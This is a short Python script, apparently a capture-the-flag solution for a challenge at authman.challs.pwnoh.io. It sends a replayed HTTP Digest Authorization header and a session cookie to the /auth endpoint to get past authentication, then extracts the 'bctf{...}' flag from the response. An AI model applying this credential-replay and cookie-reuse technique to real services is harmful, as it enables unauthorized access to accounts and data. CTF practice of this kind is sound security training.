from http.client import *

client = HTTPSConnection("authman.challs.pwnoh.io")
client.request("GET", "/auth", headers={
    "Authorization": 'Digest username="keno", realm="Authentication Required", nonce="ff958602396b76cbd4f7f978809fdf5a", uri="/auth", response="3e43af836a4597a4a91e3f5959b175d4", opaque="1503fa914d0aefe95df8d6af0bcb2c0c", algorithm="MD5", qop="auth", nc=00000001, cnonce="b9175795215ce39d"',
    "Cookie": ".eJwlyzkOgDAMBMC_uKZwgBzmM8ixs6LikKBC_B0h-pmb9DqXed1WazQRILEk7gdJNSerPiJDcikscESl7vfbrsf1hRB5gEoYnbWhSXQUTwquVntjo-cFz90d9g.aRBu9Q.q5evAq4CPBuw0Fv0xOA1A3pViFo"
    })
response = client.getresponse()
print(response.status, response.reason)
body = response.read().decode()
body = body[body.index("bctf{"):]
body = body[:body.index("}")+1]
print(body)

response.close()